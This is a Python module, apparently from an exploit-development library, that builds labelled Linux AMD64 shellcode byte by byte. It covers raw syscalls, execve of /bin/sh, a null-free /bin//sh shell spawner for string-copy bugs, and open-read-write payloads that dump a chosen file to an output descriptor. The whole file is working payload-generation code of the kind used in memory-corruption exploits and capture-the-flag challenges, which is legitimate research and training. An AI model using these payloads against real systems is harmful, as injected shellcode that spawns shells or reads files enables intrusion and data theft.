"""Small, inspectable Linux AMD64 shellcode vocabulary."""

from __future__ import annotations

from dataclasses import dataclass
from typing import Iterable

from .errors import ConstraintError, UnsupportedFeature
from .payload import Payload


_MOV_IMM64 = {
    "rax": b"\x48\xb8",
    "rdi": b"\x48\xbf",
    "rsi": b"\x48\xbe",
    "rdx": b"\x48\xba",
    "r10": b"\x49\xba",
    "r8": b"\x49\xb8",
    "r9": b"\x49\xb9",
}
_SYSCALL_ARGS = ("rdi", "rsi", "rdx", "r10", "r8", "r9")


def _u64(value: int) -> bytes:
    if not isinstance(value, int) or isinstance(value, bool):
        raise TypeError("shellcode immediate values must be integers")
    if not -(1 << 63) <= value < 1 << 64:
        raise ConstraintError(f"shellcode immediate {value} does not fit in 64 bits")
    return (value & ((1 << 64) - 1)).to_bytes(8, "little")


def _mov(register: str, value: int) -> bytes:
    try:
        opcode = _MOV_IMM64[register]
    except KeyError as error:
        raise UnsupportedFeature(f"no immediate move encoder for {register}") from error
    return opcode + _u64(value)


class ShellcodePayload(Payload):
    """Payload bytes plus the environmental assumptions they require."""

    def __init__(self, *, assumptions: Iterable[str] = ()) -> None:
        super().__init__(fill=b"\x90")
        self.assumptions = tuple(assumptions)

    def describe(self) -> str:
        assumptions = "; ".join(self.assumptions) or "none"
        return f"AMD64 Linux shellcode ({self.size} bytes; assumptions: {assumptions})"

    def copy(self) -> "ShellcodePayload":
        result = ShellcodePayload(assumptions=self.assumptions)
        result.append(self)
        return result


def _payload(
    regions: Iterable[tuple[str, bytes]],
    *,
    assumptions: Iterable[str] = (),
) -> ShellcodePayload:
    result = ShellcodePayload(assumptions=assumptions)
    for label, data in regions:
        result.append(data, label=label)
    return result


def _push_string(value: str | bytes) -> list[tuple[str, bytes]]:
    raw = value.encode() if isinstance(value, str) else bytes(value)
    if b"\0" in raw:
        raw = raw.split(b"\0", 1)[0]
    if not raw:
        raise ValueError("target-side string cannot be empty")
    regions: list[tuple[str, bytes]] = [
        ("zero string terminator", b"\x31\xd2\x52"),  # xor edx,edx; push rdx
    ]
    chunks = [raw[index : index + 8] for index in range(0, len(raw), 8)]
    for index, chunk in reversed(list(enumerate(chunks))):
        immediate = chunk.ljust(8, b"\0")
        regions.append(
            (f"string chunk {index}: {chunk!r}", b"\x48\xbb" + immediate + b"\x53")
        )
    regions.append(("rdi = rsp string pointer", b"\x48\x89\xe7"))
    return regions


@dataclass(frozen=True)
class AMD64LinuxShellcode:
    """Construct labelled syscall payloads for Linux AMD64."""

    def syscall(self, number: int, *args: int) -> Payload:
        if len(args) > 6:
            raise ValueError("Linux AMD64 syscalls accept at most six arguments")
        regions: list[tuple[str, bytes]] = [
            (f"rax = syscall {number}", _mov("rax", number)),
        ]
        regions.extend(
            (f"{register} = argument {index}", _mov(register, value))
            for index, (register, value) in enumerate(
                zip(_SYSCALL_ARGS, args, strict=False)
            )
        )
        regions.append(("syscall", b"\x0f\x05"))
        return _payload(
            regions,
            assumptions=(
                "Linux AMD64 syscall ABI",
                "target memory is executable",
                f"syscall {number} is permitted",
            ),
        )

    def exit(self, status: int = 0) -> Payload:
        return self.syscall(60, status)

    def read(self, fd: int, buffer: int, count: int) -> Payload:
        return self.syscall(0, fd, buffer, count)

    def write(self, fd: int, buffer: int, count: int) -> Payload:
        return self.syscall(1, fd, buffer, count)

    def openat(
        self,
        path: str | bytes,
        *,
        dirfd: int = -100,
        flags: int = 0,
        mode: int = 0,
    ) -> Payload:
        regions = _push_string(path)
        regions.extend(
            [
                ("rdi = AT_FDCWD", _mov("rdi", dirfd)),
                ("rsi = rsp path pointer", b"\x48\x89\xe6"),
                ("rdx = open flags", _mov("rdx", flags)),
                ("r10 = open mode", _mov("r10", mode)),
                ("rax = SYS_openat", _mov("rax", 257)),
                ("openat syscall", b"\x0f\x05"),
            ]
        )
        return _payload(
            regions,
            assumptions=(
                "Linux AMD64 syscall ABI",
                "target stack is writable",
                "SYS_openat is permitted",
            ),
        )

    def execve(self, path: str | bytes = "/bin/sh") -> Payload:
        regions = _push_string(path)
        regions.extend(
            [
                ("rsi = NULL argv", b"\x31\xf6"),
                ("rdx = NULL envp", b"\x31\xd2"),
                ("rax = SYS_execve", b"\x6a\x3b\x58"),
                ("execve syscall", b"\x0f\x05"),
            ]
        )
        return _payload(
            regions,
            assumptions=(
                "Linux AMD64 syscall ABI",
                "target stack is writable",
                "SYS_execve is permitted",
            ),
        )

    def sh(self) -> Payload:
        # Null-free /bin//sh construction, useful for line/string copies.
        return _payload(
            [
                ("rdx = NULL and string terminator", b"\x31\xd2\x52"),
                ("push /bin//sh", b"\x48\xbb/bin//sh\x53"),
                ("rdi = rsp", b"\x48\x89\xe7"),
                ("rsi = NULL", b"\x31\xf6"),
                ("rax = SYS_execve", b"\x6a\x3b\x58"),
                ("execve syscall", b"\x0f\x05"),
            ],
            assumptions=(
                "Linux AMD64 syscall ABI",
                "target stack is writable",
                "SYS_execve is permitted",
            ),
        )

    def cat(
        self,
        path: str | bytes,
        *,
        buffer: int,
        count: int = 0x100,
        output_fd: int = 1,
    ) -> Payload:
        if count <= 0:
            raise ValueError("cat read size must be positive")
        regions = _push_string(path)
        regions.extend(
            [
                ("rdi = AT_FDCWD", _mov("rdi", -100)),
                ("rsi = rsp path pointer", b"\x48\x89\xe6"),
                ("rdx = O_RDONLY", b"\x31\xd2"),
                ("r10 = mode 0", b"\x45\x31\xd2"),
                ("rax = SYS_openat", _mov("rax", 257)),
                ("open file", b"\x0f\x05"),
                ("rdi = opened fd", b"\x48\x89\xc7"),
                ("rax = SYS_read", b"\x31\xc0"),
                ("rsi = output buffer", _mov("rsi", buffer)),
                ("rdx = maximum read", _mov("rdx", count)),
                ("read file", b"\x0f\x05"),
                ("rdx = bytes read", b"\x48\x89\xc2"),
                ("rax = SYS_write", _mov("rax", 1)),
                ("rdi = output fd", _mov("rdi", output_fd)),
                ("write file", b"\x0f\x05"),
            ]
        )
        return _payload(
            regions,
            assumptions=(
                "Linux AMD64 syscall ABI",
                f"memory at {buffer:#x} is writable for {count:#x} bytes",
                "SYS_openat, SYS_read, and SYS_write are permitted",
                "the opened file descriptor remains in rax",
            ),
        )

    def orw(
        self,
        path: str | bytes,
        *,
        buffer: int,
        count: int = 0x100,
        output_fd: int = 1,
    ) -> Payload:
        return self.cat(path, buffer=buffer, count=count, output_fd=output_fd)


shellcode = AMD64LinuxShellcode()
amd64_linux = shellcode

